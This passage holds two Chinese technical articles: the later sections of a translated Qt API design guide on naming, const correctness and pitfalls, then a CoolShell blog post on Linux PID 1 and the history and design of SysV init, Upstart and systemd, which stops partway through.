### 4.3.4 返回值：按值返回 还是 按const引用返回？

若返回的是对象的拷贝，那么返回const引用是更直接的方案； 然而，这样的做法限制了后面想要对这个类的重构（refactor）。 （以`d-point`的典型做法（idiom）为例，我们可以在任何时候改变Qt类在内存表示（memory representation）；但却不能在不破坏二进制兼容性的情况下把改变函数的签名，返回值从`const QFoo &`变为`QFoo`。） 基于这个原因，除去对运行速度敏感（speed is critical）而重构不是问题的个别情形（例如，`QList::at()`），我们一般返回`QFoo`而不是`const QFoo &`。

> 【译注】：参看《Effective C++》中条款23：Don’t try to return a reference when you must return an object

### 4.4.5 const vs. 对象的状态

const正确性（Const correctness）的问题就像C圈子中vi与emacs的讨论，因为这个话题在很多地方都存在分歧（比如基于指针的函数）。

但通用准则是const函数不能改变类的可见状态。『状态』的意思是『自身以及涉及的职责』。这并不是指非const函数能够改变自身的私有成员，也不是指const函数改变不了。而是指函数是活跃的并存在可见的副作用（visible side effects）。const函数一般没有任何可见的副作用，比如：

[code language=”cpp”]
QSize size = widget->sizeHint(); // const
widget->move(10, 10); // not const
[/code]

代理（delegate）负责在其它对象上绘制内容。 它的状态包括它的职责，因此包括在哪个对象做绘制这样的状态。 调用它的绘画行为必然会有副作用； 它改变了它绘制所在设备的外观（及其所关联的状态）。鉴于这些，`paint()`作为const函数并不合理。 进一步说，任何`paint()`或`QIcon`的`paint()`的视图函数是const函数也不合理。 没有人会从内部的const函数去调用`QIcon::paint()`，除非他想显式地绕开const这个特性。 如果是这种情况，使用const_cast会更好。

[code language=”cpp”]
// QAbstractItemDelegate::paint is const
void QAbstractItemDelegate::paint(QPainter **painter, const QStyleOptionViewItem &option, const QModelIndex &index) const

// QGraphicsItem::paint is not const
void QGraphicsItem::paint(QPainter *painter, const QStyleOptionGraphicsItem option, QWidget *widget)
[/code]

const关键字并不能按你期望的样子起作用。应该考虑将其移除而不是去重载const/非const函数。

# 5. API的语义和文档

当传值为`-1`的参数给函数，函数会是什么行为？有很多类似的问题……

是警告、致命错误还是其它？

API需要的是质量保证。API第一个版本一定是不对的；必须对其进行测试。 以阅读使用API的代码的方式编写用例，且验证这样代码是可读的。

还有其他的验证方法，比如

- 让别人使用API（看了文档或是先不看文档都可以）
- 给类写文档（包含类的概述和每个函数）

# 6. 命名的艺术

命名很可能是API设计中最重要的一个问题。类应该叫什么名字？成员函数应该叫什么名字？

## 6.1 通用的命名规则

有几个规则对于所有类型的命名都等同适用。第一个，之前已经提到过，不要使用缩写。即使是明显的缩写，比如把`previous`缩写成`prev`，从长远来看是回报是负的，因为用户必须要记住缩写词的含义。

如果API本身没有一致性，之后事情自然就会越来越糟；例如，Qt 3 中同时存在`activatePreviousWindow()`与`fetchPrev()`。恪守『不缩写』规则更容易地创建一致性的API。

另一个时重要但更微妙的准则是在设计类时应该保持子类名称空间的干净。在Qt 3中，此项准则并没有一直遵循。以`QToolButton`为例对此进行说明。如果调用`QToolButton`的 `name()`、`caption()`、`text()`或者`textLabel()`，你觉得会返回什么？用Qt设计器在`QToolButton`上自己先试试吧：

- `name`属性是继承自`QObject`，返回内部的对象名称，用于调试和测试。
- `caption`属性继承自`QWidget`，返回窗口标题，对`QToolButton`来说毫无意义，因为它在创建的时候parent就存在了。
- `text`函数继承自`QButton`，一般用于按钮。当`useTextLabel`不为`true`，才用这个属性。
- `textLabel`属性在`QToolButton`内声明，当`useTextLabel`为`true`时显示在按钮上。

为了可读性，在Qt 4中`QToolButton`的`name`属性改成了`objectName`，`caption`改成了`windowTitle`，删除了`textLabel`属性因为和`text`属性相同。

当你找不到好的命名时，写文档也是个很好方法：要做的就是尝试为各个条目（item）（如类、方法、枚举值等等）写文档，并用写下的第一句话作为启发。如果找不到一个确切的命名，往往说明这个条目是不该有的。如果所有尝试都失败了，并且你坚信这个概念是合理的，那么就发明一个新名字。像widget、event、focus和buddy这些命名就是在这一步诞生的。

> 【译注】：写文档是一个非常好的习惯。写文档的过程其实就是在帮你梳理你的编程思路。很多时候，文档写着写着你就会发现要去改代码去了。除了上述的好处多，写文档还有更多的好处。比如，在写文档的过程中，你发现文字描述过于复杂了，这表明着你的代码或逻辑是复杂的，这就倒逼你去重构你的代码。所以 —— **写文档其实就是写代码**。

## 6.2 类的命名

识别出类所在的分组，而不是为每个类都去找个完美的命名。例如，所有Qt 4的能感知模型（model-aware）的item view，类后缀都是`View`（`QListView`、`QTableView`、`QTreeView`），而相应的基于item（item-based）的类后缀是`Widget`（`QListWidget`、`QTableWidget`、`QTreeWidget`）。

## 6.3 枚举类型及其值的命名

声明枚举类型时，需要记住在C++中枚举值在使用时不会带上类型（与Java、C#不同）。下面的例子演示了枚举值命名得过于通用的危害：

[code language=”cpp”]
namespace Qt
{
enum Corner { TopLeft, BottomRight, … };
enum CaseSensitivity { Insensitive, Sensitive };
…
};

tabWidget->setCornerWidget(widget, Qt::TopLeft);
str.indexOf("$(QTDIR)", Qt::Insensitive);
[/code]

在最后一行，`Insensitive`是什么意思？命名枚举类型的一个准则是在枚举值中至少重复此枚举类型名中的一个元素：

[code language=”cpp”]
namespace Qt
{
enum Corner { TopLeftCorner, BottomRightCorner, … };
enum CaseSensitivity { CaseInsensitive, CaseSensitive };
…
};

tabWidget->setCornerWidget(widget, Qt::TopLeftCorner);
str.indexOf("$(QTDIR)", Qt::CaseInsensitive);
[/code]

当对枚举值进行或运算并作为某种标志（flag）时，传统的做法是把或运算的结果保存在int型的值中，但这不是类型安全的。Qt 4提供了一个模板类`QFlags`，其中的`T`是枚举类型。为了方便使用，Qt用`typedef`重新定义了`QFlag`类型，所以可以用`Qt::Alignment`代替`QFlags`。

习惯上，枚举类型命名用单数形式（因为它一次只能『持有』一个flag），而持有多个『flag』的类型用复数形式，例如：

[code language=”cpp”]
enum RectangleEdge { LeftEdge, RightEdge, … };
typedef QFlags<RectangleEdge> RectangleEdges;
[/code]

在某些情形下，持有多个『flag』的类型命名用单数形式。对于这种情况，持有的枚举类型名称要求是以`Flag`为后缀：

[code language=”cpp”]
enum AlignmentFlag { AlignLeft, AlignTop, … };
typedef QFlags<AlignmentFlag> Alignment;
[/code]

## 6.4 函数和参数的命名

函数命名的第一准则是可以从函数名看出来此函数是否有副作用。在Qt 3中，const函数`QString::simplifyWhiteSpace()`违反了此准则，因为它返回了一个`QString`而不是按名称暗示的那样，改变调用它的`QString`对象。在Qt 4中，此函数重命名为`QString::simplified()`。

虽然参数名不会出现在使用API的代码中，但是它们给程序员提供了重要信息。因为现代的IDE都会在写代码时显示参数名称，所以值得在头文件中给参数起一个恰当的名字并在文档中使用相同的名字。

## 6.5 布尔类型的getter与setter方法的命名

为`bool`属性的getter和setter方法命名总是很痛苦。getter应该叫做`checked()`还是`isChecked()`？`scrollBarsEnabled()`还是`areScrollBarEnabled()`？

Qt 4中，我们套用以下准则为getter命名：

- 形容词以

  ```
  is
  ```

  为前缀，例子：

  - `isChecked()`
  - `isDown()`
  - `isEmpty()`
  - `isMovingEnabled()`

- 然而，修饰名词的形容词没有前缀：

  - `scrollBarsEnabled()`，而不是`areScrollBarsEnabled()`

- 动词没有前缀，也不使用第三人称(

  ```
  -s
  ```

  )：

  - `acceptDrops()`，而不是`acceptsDrops()`
  - `allColumnsShowFocus()`

- 名词一般没有前缀：

  - `autoCompletion()`，而不是`isAutoCompletion()`
  - `boundaryChecking()`

- 有的时候，没有前缀容易产生误导，这种情况下会加上

  ```
  is
  ```

  前缀：

  - `isOpenGLAvailable()`，而不是`openGL()`
  - `isDialog()`，而不是`dialog()`
    （一个叫做`dialog()`的函数，一般会被认为是返回`QDialog`。）

setter的名字由getter衍生，去掉了前缀后在前面加上了`set`；例如，`setDown()`与`setScrollBarsEnabled()`。

# 7. 避免常见陷阱

## 7.1 简化的陷阱

一个常见的误解是：实现需要写的代码越少，API就设计得越好。应该记住：代码只会写上几次，却要被反复阅读并理解。例如：

[code language=”cpp”]
QSlider *slider = new QSlider(12, 18, 3, 13, Qt::Vertical, 0, "volume");
[/code]

这段代码比下面的读起来要难得多（甚至写起来也更难）：

[code language=”cpp”]
QSlider *slider = new QSlider(Qt::Vertical);
slider->setRange(12, 18);
slider->setPageStep(3);
slider->setValue(13);
slider->setObjectName("volume");
[/code]

> 【译注】：在有IDE的自动提示的支持下，后者写起来非常方便，而前者还需要看相应的文档。

## 7.2 布尔参数的陷阱

布尔类型的参数总是带来无法阅读的代码。给现有的函数增加一个`bool`型的参数几乎永远是一种错误的行为。仍以Qt为例，`repaint()`有一个`bool`类型的可选参数用于指定背景是否被擦除。可以写出这样的代码：

[code language=”cpp”]
widget->repaint(false);
[/code]

初学者很可能是这样理解的，『不要重新绘制！』，能有多少Qt用户真心知道下面3行是什么意思：

[code language=”cpp”]
widget->repaint();
widget->repaint(true);
widget->repaint(false);
[/code]

更好的API设计应该是这样的：

[code language=”cpp”]
widget->repaint();
widget->repaintWithoutErasing();
[/code]

在Qt 4中，我们通过移除了重新绘制（repaint）而不擦除widget的能力来解决了此问题。Qt 4的双缓冲使这种特性被废弃。

还有更多的例子：

[code language=”cpp”]
widget->setSizePolicy(QSizePolicy::Fixed, QSizePolicy::Expanding, true);
textEdit->insert("Where’s Waldo?", true, true, false);
QRegExp rx("moc_***.c??", false, true);
[/code]

一个明显的解决方案是`bool`类型改成枚举类型。我们在Qt 4的`QString`中就是这么做的。对比效果如下：

[code language=”cpp”]
str.replace("%USER%", user, false); // Qt 3
str.replace("%USER%", user, Qt::CaseInsensitive); // Qt 4
[/code]

> 【译注】：关于这个条目可以看看 CoolShell 这篇文章一些展开的讨论： [千万不要把 BOOL 设计成函数参数](https://coolshell.cn/articles/5444.html)。

# 8. 案例研究

## 8.1 `QProgressBar`

为了展示上文各种准则的实际应用。我们来研究一下Qt 3中`QProgressBar`的API，并与Qt 4中对应的API作比较。在Qt 3中：

[code language=”cpp”]
class QProgressBar : public QWidget
{
…
public:
int totalSteps() const;
int progress() const;

const QString &progressString() const;
bool percentageVisible() const;
void setPercentageVisible(bool);

void setCenterIndicator(bool on);
bool centerIndicator() const;

void setIndicatorFollowsStyle(bool);
bool indicatorFollowsStyle() const;

public slots:
void reset();
virtual void setTotalSteps(int totalSteps);
virtual void setProgress(int progress);
void setProgress(int progress, int totalSteps);

protected:
virtual bool setIndicator(QString &progressStr,
int progress,
int totalSteps);
…
};
[/code]

该API相当的复杂和不一致；例如，`reset()`、`setTotalSteps()`、`setProgress()`是紧密联系的，但方法的命名并没明确地表达出来。

改善此API的关键是抓住`QProgressBar`与Qt 4的`QAbstractSpinBox`及其子类`QSpinBox`、`QSlider`、`QDail`之间的相似性。怎么做？把`progress`、`totalSteps`替换为`minimum`、`maximum`和`value`。增加一个`valueChanged()`消息，再增加一个`setRange()`函数。

进一步可以观察到`progressString`、`percentage`与`indicator`其实是一回事，即是显示在进度条上的文本。通常这个文本是个百分比，但是可通过`setIndicator()`设置为任何内容。以下是新的API：

[code language=”cpp”]
virtual QString text() const;
void setTextVisible(bool visible);
bool isTextVisible() const;
[/code]

默认情况下，显示文本是百分比指示器（percentage indicator），通过重写`text()`方法来定制行为。

Qt 3的`setCenterIndicator()`与`setIndicatorFollowsStyle()`是两个影响对齐方式的函数。他们可被一个`setAlignment()`函数代替：

[code language=”cpp”]
void setAlignment(Qt::Alignment alignment);
[/code]

如果开发者未调用`setAlignment()`，那么对齐方式由风格决定。对于基于`Motif`的风格，文字内容在中间显示；对于其他风格，在右侧显示。

下面是改善后的`QProgressBar API`:

[code language=”cpp”]
class QProgressBar : public QWidget
{
…
public:
void setMinimum(int minimum);
int minimum() const;
void setMaximum(int maximum);
int maximum() const;
void setRange(int minimum, int maximum);
int value() const;

virtual QString text() const;
void setTextVisible(bool visible);
bool isTextVisible() const;
Qt::Alignment alignment() const;
void setAlignment(Qt::Alignment alignment);

public slots:
void reset();
void setValue(int value);

signals:
void valueChanged(int value);
…
};
[/code]

## 8.2 `QAbstractPrintDialog` & `QAbstractPageSizeDialog`

Qt 4.0有2个幽灵类`QAbstractPrintDialog`和`QAbstractPageSizeDialog`，作为 `QPrintDialog`和`QPageSizeDialog`类的父类。这2个类完全没有用，因为Qt的API没有是`QAbstractPrint-`或是`-PageSizeDialog`指针作为参数并执行操作。通过篡改qdoc（Qt文档），我们虽然把这2个类隐藏起来了，却成了无用抽象类的典型案例。

这不是说，***好\*** 的抽象是错的，`QPrintDialog`应该是需要有个工厂或是其它改变的机制 —— 证据就是它声明中的`#ifdef QTOPIA_PRINTDIALOG`。

## 8.3 `QAbstractItemModel`

关于模型/视图（model/view）问题的细节在相应的文档中已经说明得很好了，但作为一个重要的总结这里还需要强调一下：抽象类不应该仅是所有可能子类的并集（union）。这样『合并所有』的父类几乎不可能是一个好的方案。`QAbstractItemModel`就犯了这个错误 —— 它实际上就是个`QTreeOfTablesModel`，结果导致了错综复杂（complicated）的API，而这样的API要让 ***所有本来设计还不错的子类\*** 去继承。

仅仅增加抽象是不会自动就把API变得更好的。

## 8.4 `QLayoutIterator` & `QGLayoutIterator`

在Qt 3，创建自定义的布局类需要同时继承`QLayout`和`QGLayoutIterator`（命名中的`G`是指Generic（通用））。`QGLayoutIterator`子类的实例指针会包装成`QLayoutIterator`，这样用户可以像和其它的迭代器（iterator）类一样的方式来使用。通过`QLayoutIterator`可以写出下面这样的代码：

[code language=”cpp”]
QLayoutIterator it = layout()->iterator();
QLayoutItem **child;
while ((child = it.current()) != 0) {
if (child->widget() == myWidget) {
it.takeCurrent();
return;
}
++it;
}
[/code]

在Qt 4，我们干掉了`QGLayoutIterator`类（以及用于盒子布局和格子布局的内部子类），转而是让`QLayout`的子类重写`itemAt()`、`takeAt()`和`count()`。

## 8.5 `QImageSink`

Qt 3有一整套类用来把完成增量加载的图片传递给一个动画 —— `QImageSource`/`Sink`/`QASyncIO`/`QASyncImageIO`。由于这些类之前只是用于启用动画的`QLabel`，完全过度设计了（overkill）。

从中得到的教训就是：对于那些未来可能的还不明朗的需求，不要过早地增加抽象设计。当需求真的出现时，比起一个复杂的系统，在简单的系统新增需求要容易得多。

# LINUX PID 1 和 SYSTEMD

#####  [2017年07月16日 ](https://coolshell.cn/articles/17998.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [49 条评论](https://coolshell.cn/articles/17998.html#comments) 88,849 人阅读

![img](photo/systemd.jpeg)要说清 Systemd，得先从Linux操作系统的启动说起。Linux 操作系统的启动首先从 BIOS 开始，然后由 Boot Loader 载入内核，并初始化内核。内核初始化的最后一步就是启动 init 进程。这个进程是系统的第一个进程，PID 为 1，又叫超级进程，也叫根进程。它负责产生其他所有用户进程。所有的进程都会被挂在这个进程下，如果这个进程退出了，那么所有的进程都被 kill 。如果一个子进程的父进程退了，那么这个子进程会被挂到 PID 1 下面。（注：PID 0 是内核的一部分，主要用于内进换页，参看：[Process identifier](https://en.wikipedia.org/wiki/Process_identifier)）

目录



[SysV Init](https://coolshell.cn/articles/17998.html#SysV_Init)[UpStart](https://coolshell.cn/articles/17998.html#UpStart)[Systemd](https://coolshell.cn/articles/17998.html#Systemd)[Systemd 争论和八卦](https://coolshell.cn/articles/17998.html#Systemd_争论和八卦)[其它](https://coolshell.cn/articles/17998.html#其它)[延伸阅读](https://coolshell.cn/articles/17998.html#延伸阅读)

#### SysV Init

PID 1 这个进程非常特殊，其主要就任务是把整个操作系统带入可操作的状态。比如：启动 UI – Shell 以便进行人机交互，或者进入 X 图形窗口。传统上，PID 1 和传统的 Unix System V 相兼容的，所以也叫 `sysvinit`，这是使用得最悠久的 init 实现。Unix System V 于1983年 release。

在 `sysvint` 下，有好几个运行模式，又叫 `runlevel`。比如：常见的 3 级别指定启动到多用户的字符命令行界面，5 级别指定启起到图形界面，0 表示关机，6 表示重启。其配置在 `/etc/inittab` 文件中。



与此配套的还有 `/etc/init.d/` 和 `/etc/rc[X].d`，前者存放各种进程的启停脚本（需要按照规范支持 `start`，`stop`子命令），后者的 X 表示不同的 runlevel 下相应的后台进程服务，如：`/etc/rc3.d` 是 runlevel=3 的。 里面的文件主要是 link 到  `/etc/init.d/` 里的启停脚本。其中也有一定的命名规范：S 或 K 打头的，后面跟一个数字，然后再跟一个自定义的名字，如：`S01rsyslog`，`S02ssh`。S 表示启动，K表示停止，数字表示执行的顺序。

#### UpStart

Unix 和 Linux 在 `sysvint` 运作多年后，大约到了2006年的时候，Linux内核进入2.6时代，Linux有了很多更新。并且，Linux开始进入桌面系统，而桌面系统和服务器系统不一样的是，桌面系统面临频繁重启，而且，用户会非常频繁的使用硬件的热插拔技术。于是，这些新的场景，让 `sysvint` 受到了很多挑战。

比如，打印机需要CUPS等服务进程，但是如果用户没有打机印，启动这个服务完全是一种浪费，而如果不启动，如果要用打印机了，就无法使用，因为`sysvint` 没有自动检测的机制，它只能一次性启动所有的服务。另外，还有网络盘挂载的问题。在 `/etc/fstab` 中，负责硬盘挂载，有时候还有网络硬盘（NFS 或 iSCSI）在其中，但是在桌面机上，有很可能开机的时候是没有网络的， 于是网络硬盘都不可以访问，也无法挂载，这会极大的影响启动速度。`sysvinit` 采用 `netdev` 的方式来解决这个问题，也就是说，需要用户自己在 `/etc/fstab` 中给相应的硬盘配置上 `netdev` 属性，于是 `sysvint` 启动时不会挂载它，只有在网络可用后，由专门的 `netfs` 服务进程来挂载。这种管理方式比较难以管理，也很容易让人掉坑。

所以，Ubuntu 开发人员在评估了当时几个可选的 init 系统后，决定重新设计这个系统，于是，这就是我们后面看到的 `upstart` 。 `upstart` 基于事件驱动的机制，把之前的完全串行的同步启动服务的方式改成了由事件驱动的异步的方式。比如：如果有U盘插入，`udev` 得到通知，`upstart` 感知到这个事件后触发相应的服务程序，比如挂载文件系统等等。因为使用一个事件驱动的玩法，所以，启动操作系统时，很多不必要的服务可以不用启动，而是等待通知，lazy 启动。而且事件驱动的好处是，可以并行启动服务，他们之间的依赖关系，由相应的事件通知完成。

upstart 有着很不错的设计，其中最重要的两个概念是 Job 和 Event。

**Job** 有一般的Job，也有service的Job，并且，`upstart` 管理了整个 Job 的生命周期，比如：Waiting, Starting, pre-Start, Spawned, post-Start, Running, pre-Stop, Stopping, Killed, post-Stop等等，并维护着这个生命周期的状态机。

**Event** 分成三类，`signal`, `method` 和 `hooks`。`signal` 就是异步消息，`method` 是同步阻塞的。`hooks` 也是同步的，但介于前面两者之间，发出hook事件的进程必须等到事件完成，但不检查是否成功。

但是，`upstart` 的事件非常复杂，也非常纷乱，各种各样的事件（事件没有归好类）导致有点凌乱。不过因为整个事件驱动的设计比之前的 `sysvinit` 来说好太多，所以，也深得欢迎。

#### Systemd

直到2010的有一天，一个在 RedHat工作的工程师 [Lennart Poettering](https://en.wikipedia.org/wiki/Lennart_Poettering) 和 [Kay Sievers](https://en.wikipedia.org/wiki/Kay_Sievers) ，开始引入了一个新的 `init` 系统—— `systemd`。这是一个非常非常有野心的项目，这个项目几乎改变了所有的东西，`systemd` 不但想取代已有的 init 系统，而且还想干更多的东西。

Lennart 同意 `upstart` 干的不错，代码质量很好，基于事件的设计也很好。但是他觉得 `upstart` 也有问题，其中最大的问题还是不够快，虽然 `upstart` 用事件可以达到一定的启动并行度，但是，本质上来说，这些事件还是会让启动过程串行在一起。  如：`NetworkManager` 在等 `D-Bus` 的启动事件，而 `D-Bus` 在等 `syslog` 的启动事件。

Lennart 认为，实现上来说，`upstart` 其实是在管理一个逻辑上的服务依赖树，但是这个服务依赖树在表现形式上比较简单，你只需要配置——“启动 B好了就启动A”或是“停止了A后就停止B”这样的规则。但是，Lennart 说，这种简单其实是有害的（this simplification is actually detrimental）。他认为，

- 从一个系统管理的角度出来，他一开始会设定好整个系统启动的服务依赖树，但是这个系统管理员要人肉的把这个本来就非常干净的服务依整树给翻译成计算机看的懂的 Event/Action 形式，而且 Event/Action 这种配置方式是运行时的，所以，你需要运行起来才知道是什么样的。

- Event逻辑从头到脚到处都是，这个事件扩大了运维的复杂度，还不如之前的 `sysvint`。 也就是说，当用户配置了 “启动 `D-Bus` 后请启动 `NetworkManager`”， 这个 `upstart` 可以干，但是反过来，如果，用户启动 `NetworkManager`，我们应该先去启动他的前置依赖 `D-Bus`，然而你还要配置相应的反向 Event。本来，我只需要配置一条依赖的，结果现在我要配置很多很多情况下的Event。

- 最后，`upstart` 里的 Event 的并不标准，很混乱，没有良好的定义。比如：既有，进程启动，运行，停止的事件，也有USB设备插入、可用、拔出的事件，还有文件系统设备being mounted、 mounted 和 umounted 的事件，还有AC电源线连接和断开的事件。你会发现，这进程启停的、USB的、文件系统的、电源线的事件，看上去长得很像， 但是没有被标准化抽像出来掉，因为绝大多数的事件都是三元组：start, condition, stop 。这种概念设计模型并没有在 `upstart` 中出现。因为 `upstart` 被设计为单一的事件，而忽略了逻辑依赖。

当然，如果 `systemd` 只是解决 `upstart` 的问题，他就改造 `upstart` 就好了，但是 Lennart 的野心不只是想干个这样的事，他想干的更多。

首先，`systemd` 清醒的认识到了 init 进程的首要目标是要让用户快速的进入可以操作OS的环境，所以，这个速度一定要快，越快越好，所以，`systemd` 的设计理念就是两条：

- To start **less**.
- And to start **more** in *parallel*.

也就是说，按需启动，能不启动就不启动，如果要启动，能并行启动就并行启动，包括你们之间有依赖，我也并行启动。按需启动还好理解，那么，有依赖关系的并行启动，它是怎么做到的？这里，`systemd` 借鉴了 MacOS 的 `Launchd` 的玩法（在Youtube上有一个分享——[Launchd: One Program to Rule them All](https://www.youtube.com/watch?v=SjrtySM9Dns)，在苹果的开源网站上也有相关的设计文档——[About Daemons and Services](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html)）

要解决这些依赖性，systemd 需要解决好三种底层依赖—— Socket， D-Bus ，文件系统。

- **Socket依赖**。如果服务C依赖于服务S的socket，那么就要先启动S，然后再启动C，因为如果C启动时找不到S的Socket，那么C就会失败。`systemd` 可以帮你在S还没有启动好的时候，建立一个socket，用来接收所有的C的请求和数据，并缓存之，一旦S全部启动完成，把systemd替换好的这个缓存的数据和Socket描述符替换过去。

 

- **D-Bus依赖**。`D-Bus` 全称 Desktop Bus，是一个用来在进程间通信的服务。除了用于用户态进程和内核态进程通信，也用于用户态的进程之前。现在，很多的现在的服务进程都用 `D-Bus` 而不是Socket来通信。比如：`NetworkManager` 就是通过 `D-Bus` 和其它服务进程通讯的，也就是说，如果一个进程需要知道网络的状态，那么就必需要通过 `D-Bus` 通信。`D-Bus` 支持 “Bus Activation”的特性。也就是说，A要通过 `D-Bus` 服务和B通讯，但是B没有启动，那么 `D-Bus` 可以把B起来，在B启动的过程中，`D-Bus` 帮你缓存数据。`systemd` 可以帮你利用好这个特性来并行启动 A 和 B。

 

- **文件系统依赖**。系统启动过程中，文件系统相关的活动是最耗时的，比如挂载文件系统，对文件系统进行磁盘检查（fsck），磁盘配额检查等都是非常耗时的操作。在等待这些工作完成的同时，系统处于空闲状态。那些想使用文件系统的服务似乎必须等待文件系统初始化完成才可以启动。`systemd` 参考了 `autofs` 的设计思路，使得依赖文件系统的服务和文件系统本身初始化两者可以并发工作。`autofs` 可以监测到某个文件系统挂载点真正被访问到的时候才触发挂载操作，这是通过内核 `automounter` 模块的支持而实现的。比如一个 `open()` 系统调用作用在某个文件系统上的时候，而这个文件系统尚未执行挂载，此时 `open()` 调用被内核挂起等待，等到挂载完成后，控制权返回给 `open()` 系统调用，并正常打开文件。这个过程和 `autofs` 是相似的。

 

下图来自 Lennart 的演讲里的一页PPT，展示了不同 init 系统的启动。

![img](photo/boot.png)

除此之外，systemd 还在启动时管理好了一些下面的事。

用C语言取代传统的脚本式的启动。前面说过，`sysvint` 用 `/etc/rcX.d` 下的各种脚本启动。然而这些脚本中需要使用 `awk`, `sed`, `grep`, `find`, `xargs` 等等这些操作系统的命令，这些命令需要生成进程，生成进程的开销很大，关键是生成完这些进程后，这个进程就干了点屁大的事就退了。换句话说就是，我操作系统干了那么多事为你拉个进程起来，结果你就把个字串转成小写就退了，把我操作系统当什么了？

在正常的一个 `sysvinit` 的脚本里，可能会有成百上千个这样的命令。所以，慢死。因此，`systemd` 全面用 C 语言全部取代了。一般来说，`sysvinit` 下，操作系统启动完成后，用 `echo $$` 可以看到，pid 被分配到了上千的样子，而 `systemd` 的系统只是上百。

另外，systemd 是真正一个可以管住服务进程的——可以跟踪上服务进程所fork/exec出来的所有进程。

- 我们知道， 传统 Unix/Linux 的 Daemon 服务进程的最佳实践基本上是这个样子的 （具体过程可参看这篇文章“

  SysV Daemon

  ”）——

  1. 进程启动时，关闭所有的打开的文件描述符（除了标准描述符0,1,2），然后重置所有的信号处理。
  2. 调用 `fork()` 创建子进程，在子进程中 `setsid()`，然后父进程退出（为了后台执行）
  3. 在子进程中，再调用一次 `fork()`，创建孙子进程，确定没有交互终端。然后子进程退出。
  4. 在孙子进程中，把标准输入标准输出标准错误都连到 `/dev/null` 上，还要创建 pid 文件，日志文件，处理相关信号 ……
  5. 最后才是真正开始提供服务。

 

- 在上面的这个过程中，服务进程除了两次 `fork` 外还会 `fork` 出很多很多的子进程（比如说一些Web服务进程，会根据用户的请求链接来 `fork` 子进程），这个进程树是相当难以管理的，因为，一旦父进程退出来了，子进程就会被挂到 PID 1下，所以，基本上来说，你无法通过服务进程自已给定的一个pid文件来找到所有的相关进程（这个对开发者的要求太高了），所以，在传统的方式下用脚本启停服务是相当相当的 Buggy 的，因为无法做对所有的服务生出来的子子孙孙做到监控。

 

- 为了解决这个问题，`upstart` 通过变态的 `strace` 来跟踪进程中的 `fork()` 和 `exec()` 或 `exit()` 等相关的系统调用。这种方法相当笨拙。 `systemd` 使用了一个非常有意思的玩法来 tracking 服务进程生出来的所有进程，那就是用 `cgroup` （我在 [Docker 的基础技术“cgroup篇”](https://coolshell.cn/articles/17049.html)中讲过这个东西）。cgroup主要是用来管理进程组资源配额的事，所以，无论服务如何启动新的子进程，所有的这些相关进程都会同属于一个 `cgroup`，所以，`systemd` 只需要简单的去遍历一下相应的 `cgroup` 的那个虚文件系统目录下的文件，就可以正确的找到所有的相关进程，并将他们一一停止。

 

另外，`systemd` 简化了整个 daemon 开发的过程：

- 不需要两次 `fork()`，只需要实现服务本身的主逻辑就可以了。
- 不需要 `setsid()`，`systemd` 会帮你干
- 不需要维护 `pid文件`，`systemd` 会帮处理。
- 不需要管理日志文件或是使用`syslog`，或是处理`HUP`的日志reload信号。把日志打到 `stderr` 上，`systemd` 帮你管理。
- 处理 `SIGTERM` 信号，这个信号就是正确退出当前服务，不要做其他的事。
- ……

除此之外，`systemd` 还能——

- 自动检测启动的服务间有没有环形依赖。
- 内建 autofs 自动挂载管理功能。
- 日志服务。`systemd` 改造了传统的 syslog 的问题，采用二进制格式保存日志，日志索引更快。
- 快照和恢复。对当前的系统运行的服务集合做快照，并可以恢复。
- ……

还有好多好多，他接管很多很多东西，于是就让很多人不爽了，因为他在干了很多本不属于 PID 1 的事。

#### Systemd 争论和八卦

于是 `systemd` 这个东西成了可能是有史以来口水战最多的一个开源软件了。`systemd` 饱受各种争议，最大的争议就是他破坏了 Unix 的设计哲学（相关的哲学可以读一下《[Unix编程艺术](https://book.douban.com/subject/1467587/)》），干了一个大而全而且相当复杂的东西。当然，Lennart 并不同意这样的说法，他后来又写一篇blog “[The Biggest Myths](http://0pointer.de/blog/projects/the-biggest-myths.html)”来解释 `systemd` 并不是这样的，大家可以前往一读。

这个争议大到什么样子呢？2014 年，Debian Linux 因为想准备使用 `systemd` 来作为标准的 init 守护进程来替换 `sysvinit` 。而围绕这个事的争论达到了空前的热度，争论中充满着仇恨，`systemd` 的支持者和反对者都在互相辱骂，导致当时 Debian 阵营开始分裂。还有人给 Lennart 发了死亡威胁的邮件，用比特币雇凶买杀手，扬言要取他的性命，在Youbute上传了侮辱他的歌曲，在IRC和各种社交渠道上给他发下流和侮辱性的消息。这已经不是争议了，而是一种不折不扣的仇恨！

![img](photo/systemd_shewantsit.jpg)

于是，Lennart 在 [Google Plus 上发了贴子](https://plus.google.com/+LennartPoetteringTheOneAndOnly/posts/J2TZrTvu7vd)，批评整个 Linux 开源社区和 Linus 本人。他大意说，

> 这个社区太病态了，全是 ass holes，你们不停用各种手段在各种地方用不同的语言和方式来侮辱和漫骂我。我还是一个年轻人，我从来没有经历过这样的场面，但是今天我已经对这种场面很熟悉了。我有时候说话可能不准确，但是我不会像他样那样说出那样的话，我也没有被这些事影响，因为我脸皮够厚，所以，为什么我可以在如何大的反对声面前让 `systemd` 成功，但是，你们 Linux 社区太可怕了。你们里面的有精神病的人太多了。另外，对于Linus Torvalds，你是这个社区的 Role Model，但可惜你是一个 Bad Role Model，你在社区里的刻薄和侮辱性的言行，基本从一定程度上鼓励了其它人跟你一样，当然，并不只是你一个人的问题，而是在你周围聚集了一群和你一样的这样干的人。送你一句话—— A fish rots from the head down ！一条鱼是从头往下腐烂的……

这篇契文很长，喜欢八卦的同学可以前往一读。感受一下 Lennart 当时的心态（我觉得能算上是非常平稳了）。

Linus也在被一媒体问起 `systemd` 这个事来（参看“[Torvalds says he has no strong opinions on systemd](https://www.itwire.com/business-it-news/open-source/65402-torvalds-says-he-has-no-strong-opinions-on-systemd)”），Linus在采访里说，

> 我对 `systemd` 和 Lennart 的贴子没有什么强烈的想法。虽然，传统的 Unix 设计哲学—— “Do one thing and Do it well”，很不错，而且我们大多数人也实践了这么多年，但是这并不代表所有的真实世界。在历史上，也不只有`systemd` 这么干过。但是，我个人还是 old-fashioned 的人，至少我喜欢文本式的日志，而不是二进制的日志。但是 `systemd` 没有必要一定要有这样的品味。哦，我说细节了……

